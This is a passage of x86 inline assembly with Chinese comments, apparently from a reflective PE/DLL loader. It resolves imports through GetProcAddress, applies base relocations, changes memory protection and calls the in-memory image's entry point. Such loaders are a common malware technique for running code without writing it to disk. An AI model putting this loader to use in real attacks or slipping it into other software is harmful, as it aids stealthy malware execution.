		mov     edx, [ebp+module_handle]
		add     edx, [ecx]
		mov     [ebp+var_20], edx
		mov     eax, [ebp+var_20]
		mov     ecx, [ebp+module_handle]
		add     ecx, [eax+0x1C]
		mov     [ebp+var_28], ecx
		mov     edx, [ebp+var_14]
		mov     eax, [edx]
		and     eax, 0x0FFFF
		mov     ecx, [ebp+var_20]
		sub     eax, [ecx+0x10]
		mov     edx, [ebp+var_28]
		lea     eax, [edx+eax*4]
		mov     [ebp+var_28], eax
		mov     ecx, [ebp+var_28]
		mov     edx, [ebp+module_handle]
		add     edx, [ecx]
		mov     eax, [ebp+var_C]
		mov     [eax], edx
		jmp     loc_4636FE

loc_4636E0:										// 名称导入
		mov     ecx, [ebp+var_C]
		mov     edx, [ebp+var_8]				
		add     edx, [ecx]
		mov     [ebp+BaseDllName], edx
		mov     eax, [ebp+BaseDllName]
		add     eax, 2
		push    eax
		mov     ecx, [ebp+module_handle]
		push    ecx
		call    [ebp+pGetProcAddress]			// 读取函数名称获取函数地址
		mov     edx, [ebp+var_C]
		mov     [edx], eax      				// 填充导入表IAT

loc_4636FE:
		mov     eax, [ebp+var_C]				// 下一个函数
		add     eax, 4
		mov     [ebp+var_C], eax
		cmp     dword ptr[ebp+var_14], 0
		jz      loc_463716
		mov     ecx, [ebp+var_14]
		add     ecx, 4
		mov     [ebp+var_14], ecx

loc_463716:
		jmp     loc_463665						// 循环填充

loc_46371B:
		mov     edx, [ebp+name_hash]			// name_hash = 申请地址的导入表
		add     edx, 0x14
		mov     [ebp+name_hash], edx
		jmp     loc_463631						// 下一个导入表结构

loc_463729:
		mov     eax, [ebp+var_24]				// var_24 = signature
		mov     ecx, [ebp+var_8]				// var_8 = mem_address
		sub     ecx, [eax+0x34]					// 当前加载基址 - 默认加载基址   meMaddress - ImageBase
		mov     [ebp+address], ecx
		mov     edx, 8
		imul    eax, edx, 5						// 第6个表 重定位表
		mov     ecx, [ebp+var_24]
		lea     edx, [ecx+eax+0x78]				
		mov     [ebp+BaseDllName], edx
		mov     eax, [ebp+BaseDllName]
		cmp     dword ptr [eax+4], 0
		jz      loc_4638F2						// 修复结束跳转
		mov     ecx, [ebp+BaseDllName]
		mov     edx, [ebp+var_8]
		add     edx, [ecx]						// 定位IMAGE_BASE_RELOCATION 
		mov     [ebp+name_hash], edx			// name_hash = _IMAGE_BASE_RELOCATION

loc_46375F:
		mov     eax, [ebp+name_hash]
		cmp     dword ptr [eax+4], 0			// IMAGE_BASE_RELOCATION -> SizeOfBlock // 结构体大小，包含TypeOffset
		jz      loc_4638F2
		mov     ecx, [ebp+name_hash]
		mov     edx, [ebp+var_8]				// var_8 = mem_address
		add     edx, [ecx]						// mem_address + 需要重定位的区域的位置RVA
		mov     [ebp+var_C], edx				// var_C = 需要重定位的区域
		mov     eax, [ebp+name_hash]
		mov     ecx, [eax+4]					// ecx = SizeOfBlock
		sub     ecx, 8
		shr     ecx, 1							// 区域内（4KB）重定位元素个数=（SizeOfBlock-8）/2
		mov     [ebp+BaseDllName], ecx			// BaseDllName = reloc_number
		mov     edx, [ebp+name_hash]
		add     edx, 8
		mov     [ebp+var_14], edx				// var_14 = TypeOffset[1];  // 存放相对于VirtualAddress的偏移

loc_46378E:
		mov     eax, [ebp+BaseDllName]
		mov     [ebp+var_60], eax
		mov     ecx, [ebp+BaseDllName]
		sub     ecx, 1
		mov     [ebp+BaseDllName], ecx			// 总数 - 1
		cmp     dword ptr[ebp+var_60], 0
		jz      loc_4638E1
		mov     edx, [ebp+var_14]
		mov     ax, [edx]       		// 获取重定位项	TypeOffset是一个以2字节为一个元素的数组 其中元素的低12位才是偏移地址，高4位是属性 
		shr     ax, 0x0C
		and     ax, 0x0F
		movzx   ecx, ax
		cmp     ecx, 0x0A
		jnz     loc_4637ED
		mov     edx, 0x0FFF
		mov     eax, [ebp+var_14]
		and     dx, [eax]
		movzx   ecx, dx
		mov     edx, [ebp+var_C]
		mov     eax, [edx+ecx]
		add     eax, [ebp+address]
		mov     ecx, 0x0FFF
		mov     edx, [ebp+var_14]
		and     cx, [edx]
		movzx   ecx, cx
		mov     edx, [ebp+var_C]
		mov     [edx+ecx], eax
		jmp     loc_4638D3

loc_4637ED:
		mov     eax, [ebp+var_14]
		mov     cx, [eax]
		shr     cx, 0x0C
		and     cx, 0x0F
		movzx   edx, cx
		cmp     edx, 3          			// 当此标记为0011（3）时低12为才有效 TypeOffset
		jnz     loc_463833
		mov     eax, 0x0FFF
		mov     ecx, [ebp+var_14]
		and     ax, [ecx]
		movzx   edx, ax
		mov     eax, [ebp+var_C]			// self_baseaddress 加载基址
		mov     ecx, [eax+edx]  			// 默认加载基址 + 重定位列表项
		add     ecx, [ebp+address]			// 计算当前基址 重定位后的地址
		mov     edx, 0x0FFF
		mov     eax, [ebp+var_14]
		and     dx, [eax]
		movzx   edx, dx
		mov     eax, [ebp+var_C]
		mov     [eax+edx], ecx 				// 修复重定位
		jmp     loc_4638D3

loc_463833:
		mov     ecx, [ebp+var_14]
		mov     dx, [ecx]
		shr     dx, 0x0C
		and     dx, 0x0F
		movzx   eax, dx
		cmp     eax, 1
		jnz     loc_463886
		mov     ecx, 0x0FFF
		mov     edx, [ebp+var_14]
		and     cx, [edx]
		movzx   eax, cx
		mov     ecx, [ebp+address]
		shr     ecx, 0x10
		and     ecx, 0x0FFFF
		movzx   edx, cx
		mov     ecx, [ebp+var_C]
		movzx   eax, word ptr [ecx+eax]
		add     eax, edx
		mov     ecx, 0x0FFF
		mov     edx, [ebp+var_14]
		and     cx, [edx]
		movzx   ecx, cx
		mov     edx, [ebp+var_C]			// 修复重定位
		mov     [edx+ecx], ax
		jmp     loc_4638D3

loc_463886:
		mov     eax, [ebp+var_14]
		mov     cx, [eax]
		shr     cx, 0x0C
		and     cx, 0x0F
		movzx   edx, cx
		cmp     edx, 2
		jnz     loc_4638D3
		mov     eax, 0x0FFF
		mov     ecx, [ebp+var_14]
		and     ax, [ecx]
		movzx   edx, ax
		mov     eax, [ebp+address]
		and     eax, 0x0FFFF
		movzx   ecx, ax
		mov     eax, [ebp+var_C]
		movzx   edx, word ptr [eax+edx]
		add     edx, ecx
		mov     eax, 0x0FFF
		mov     ecx, [ebp+var_14]
		and     ax, [ecx]
		movzx   eax, ax
		mov     ecx, [ebp+var_C]			// 修复重定位
		mov     [ecx+eax], dx

loc_4638D3:
		mov     edx, [ebp+var_14]
		add     edx, 2
		mov     [ebp+var_14], edx
		jmp     loc_46378E					

loc_4638E1:
		mov     eax, [ebp+name_hash]
		mov     ecx, [ebp+name_hash]
		add     ecx, [eax+4]
		mov     [ebp+name_hash], ecx
		jmp     loc_46375F					// 下一个块 循环修复


loc_4638F2: 
		mov     edx, [ebp+var_24]			// var_24 = signature
		mov     eax, [ebp+var_8]			// var_8 = mem_address
		add     eax, [edx+0x28]				// 入口点
		mov     [ebp+var_C], eax
		push    0
		push    0
		push    0xFFFFFFFF
		call    [ebp+ pNtFlushInstructionCache]
		lea     ecx, [ebp+var_64]
		push    ecx
		push    0x20
		mov     edx, [ebp+var_4C]
		push    edx
		mov     eax, [ebp+var_50]
		push    eax
		call    [ebp+ pVirtualProtect]
		push    0
		push    1
		mov     ecx, [ebp+var_8]
		push    ecx
		call    [ebp+var_C]    				// call 入口点
		push    0
		push    4
		mov     edx, [ebp+var_8]
		push    edx
		call    [ebp+var_C]
		mov     eax, [ebp+var_C]
		mov     esp, ebp
		pop     ebp
		retn
			
	}

}





